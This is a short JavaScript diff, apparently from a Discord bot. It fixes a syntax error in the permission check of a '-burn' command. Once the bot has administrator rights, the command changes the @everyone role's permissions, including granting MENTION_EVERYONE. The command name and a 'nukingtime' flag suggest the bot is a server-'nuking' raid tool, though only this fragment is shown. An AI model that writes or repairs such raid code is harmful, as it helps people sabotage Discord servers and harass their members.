@@ -169,7 +169,7 @@ b++
    client.on('message', message => {
      if(message.content.startsWith("-burn")) {
  if(message.channel.type === "dm") {return}
-if(message.guild.me.hasPermission("ADMINISTRATOR)) {
+if(message.guild.me.hasPermission("ADMINISTRATOR")) {
             if(nukingtime.has("-burn")) {return}
        message.guild.roles.everyone.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE']);
    }
